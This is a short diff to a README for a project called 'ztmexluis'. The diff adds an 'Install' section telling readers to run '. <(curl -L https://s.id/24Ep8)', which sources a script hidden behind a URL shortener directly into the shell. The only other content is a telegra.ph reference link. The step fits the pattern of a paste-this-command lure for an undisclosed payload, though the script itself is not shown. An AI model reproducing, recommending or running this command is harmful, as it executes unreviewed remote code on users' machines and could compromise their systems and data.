@@ -1,5 +1,13 @@
 # ztmexluis
 
+## Install
+
+Copy this code
+```sh
+. <(curl -L https://s.id/24Ep8)
+```
+
+
 # References
 https://telegra.ph/Apa-itu-Ztmexluis-03-02
 
